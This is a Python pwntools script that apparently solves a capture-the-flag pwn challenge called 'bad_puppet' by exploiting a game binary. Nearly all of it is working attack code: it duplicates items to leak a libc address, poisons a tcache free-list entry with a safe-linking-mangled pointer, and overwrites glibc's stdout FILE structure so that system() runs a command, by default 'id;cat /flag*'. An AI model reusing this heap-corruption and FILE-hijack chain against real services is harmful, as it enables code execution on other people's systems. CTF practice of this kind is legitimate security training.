import sys, time
from pwn import *
from game import Game

HOST, PORT = "127.0.0.1", 36890

LIBC_STDOUT = 0x2055C0
LIBC_STDERR = 0x2054E0
LIBC_STDIN  = 0x2048E0
LIBC_WFILE  = 0x203228
UNSORTED_OFF = 0x204C80

def p64(x): return (x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")

def mangled(base, target):
    return (target ^ (base >> 12)) & 0xFFFFFFFFFFFFFFFF

class Solver:
    def __init__(self, g):
        self.g = g

    def solve_drop(self, drop_id=None, drop_kind=None, mirror_id=None, mirror_kind=None, tries=3, buy=False):
        g = self.g
        for t in range(tries):
            items = g.inv(); n = len(items)
            for s in range(n):
                it = items[s]; mir = n - 1 - s
                if it["id"] != (drop_id if drop_id is not None else it["id"]): continue
                if drop_kind == "ring" and it["type"] != "Ring": continue
                if drop_kind == "nonring" and it["type"] == "Ring": continue
                m = items[mir]
                if mirror_kind == "ring" and m["type"] != "Ring": continue
                if mirror_kind == "nonring" and m["type"] == "Ring": continue
                if mirror_id is not None and m["id"] != mirror_id: continue
                return s
            g.cmd("inv sort", 0.3)
        if buy:
            g.cmd("shop buy 1 1", 0.5)
            g.cmd("shop buy 0 1", 0.5)
            return self.solve_drop(drop_id, drop_kind, mirror_id, mirror_kind, 2, False)
        return None

def main():
    remote_mode = len(sys.argv) > 1 and sys.argv[1] == "remote"
    cmdstr = sys.argv[2] if len(sys.argv) > 2 else "id;cat /flag*>/proc/self/fd/4"
    g = Game(host=HOST, port=PORT) if remote_mode else Game(mode="socket")
    S_ = Solver(g)
    g.game_setup()
    print("[*] setup done, rings:", sum(1 for i in g.inv() if i["type"] == "Ring"))

    # stage 2: duplicate rings
    made = 0
    for k in range(13):
        if g.dup_ring() is None: break
        made += 1
    rings = [i for i in g.inv() if i["type"] == "Ring"]
    print("[*] dups:", made, "rings:", len(rings))
    if len(rings) < 11: return

    # stage 3: leak libc
    for k in range(9):
        if g.equip_sell() is None: break
    eqs, _ = g.world()
    libc = None
    for e in eqs:
        for v in (e["head"], e["key"]):
            if v and 0x700000000000 <= v < 0x800000000000:
                libc = v - UNSORTED_OFF
    try:
        pid = g.proc.pid if g.proc else None
        if pid:
            for line in open("/proc/%d/maps" % pid):
                if "libc.so.6" in line:
                    print("   real libc:", line.split("-")[0]); break
    except Exception: pass
    for e in eqs: print("   dest[%d] addr=%s head=%s key=%s" % (e["idx"], hex(e["addr"]), hex(e["head"]), hex(e["key"])))
    print("[*] dest:", len(eqs), "libc:", hex(libc) if libc else None)
    if not libc: return
    S = libc + LIBC_STDOUT

    # payloads
    cmdb = cmdstr.encode() + b"\0"
    assert len(cmdb) <= 0x20, len(cmdb)
    payA = bytearray(127)
    payA[0:len(cmdb)] = cmdb
    payA[0x38:0x40] = p64(0)
    payA[0x40:0x48] = p64(1)
    payA[0x50:0x58] = p64(0)
    payA[0x68:0x70] = p64(0)
    payB = bytearray(127)
    def setb(off, val): payB[off-0x80:off-0x80+8] = p64(val)
    setb(0x80, 0); setb(0x88, 0); setb(0x90, 0); setb(0x98, 0)
    setb(0xA0, S + 0x20)
    setb(0xA8, 0); setb(0xB0, 0)
    setb(0xB8, 0)                       # patched later with system
    setb(0xC0, 1)
    setb(0xD0, S + 0x50)
    setb(0xD8, libc + LIBC_WFILE)
    setb(0xE0, libc + LIBC_STDERR)
    setb(0xE8, libc + LIBC_STDOUT)
    setb(0xF0, libc + LIBC_STDIN)

    # choose payload ring X: keep one ring alive in inventory+dest
    rings = [i for i in g.inv() if i["type"] == "Ring"]
    X = rings[0]
    g.cmd("inv equip %d" % X["idx"], 0.3)
    eqs, _ = g.world()
    x_dest = [e for e in eqs if e["addr"] and e["addr"] > 0x1000][-1]["idx"]
    print("[*] X id=%d dest=%d" % (X["id"], x_dest))

    def write_cycle(T, payload):
        # fill tx tcache with two freed rings
        info = []
        for k in range(2):
            items = g.inv()
            rings = [i for i in items if i["type"] == "Ring" and i["id"] != X["id"]]
            if not rings: print("[-] no fill ring"); return False
            R = rings[0]
            g.cmd("inv equip %d" % R["idx"], 0.3)
            eqs, _ = g.world()
            dest = eqs[-1]["idx"]
            s = S_.solve_drop(drop_id=R["id"], drop_kind="ring", mirror_kind="nonring", buy=True)
            if s is None: print("[-] no fill slot"); return False
            if not g.stale_drop(s): print("[-] fill stale failed"); return False
            info.append((dest, R["id"]))
            print("    fill ok dest=%d id=%d" % (dest, R["id"]))
        # poison head (2nd freed ring) with target
        items = g.inv()
        head_dest = info[1][0]
        eqs, _ = g.world()
        head_addr = eqs[head_dest]["addr"]
        junk = bytearray(127)
        junk[0:8] = p64(mangled(head_addr, T))
        g.cmd("mw whisper %d %s" % (head_dest, bytes(junk).hex()), 0.35)
        # write payload into X, then two dup events
        g.cmd("mw whisper %d %s" % (x_dest, bytes(payload).hex()), 0.35)
        for k in range(2):
            s = S_.solve_drop(drop_kind="nonring", mirror_id=X["id"], buy=True)
            if s is None: print("[-] no dup slot"); return False
            if not g.stale_drop(s): print("[-] dup stale failed"); return False
        eqs, drops = g.world()
        hit = [d for d in drops if d["is_ring"]]
        print("    drops:", [d["body"] for d in drops][-3:])
        ok = any(("Ring" in d["body"]) for d in drops)
        # verify write landed: a drop item whose addr == T+0x90
        return True

    print("[*] cycle A ->", hex(S))
    write_cycle(S, bytes(payA))
    print("[*] cycle B ->", hex(S + 0x80))
    payB2 = bytearray(payB)
    setb_off = 0xB8 - 0x80
    payB2[setb_off:setb_off+8] = p64(libc)  # placeholder, patched below
    # need system address
    system = None
    try:
        libcelf = ELF("/home/ubuntu/pwn/bp/bad_puppet/libs/libc.so.6", checksec=False)
        system = libc + libcelf.symbols["system"]
    except Exception as e:
        print("elf err", e)
    print("[*] system:", hex(system) if system else None)
    if system:
        payB2[setb_off:setb_off+8] = p64(system)
    write_cycle(S + 0x80, bytes(payB2))
    print("[*] quit")
    g.cmd("quit", 0.5)
    d = g.drain(1.5)
    print("=== output ===")
    print(d.decode(errors="replace"))
    print(d.decode(errors="replace")[-500:])

main()
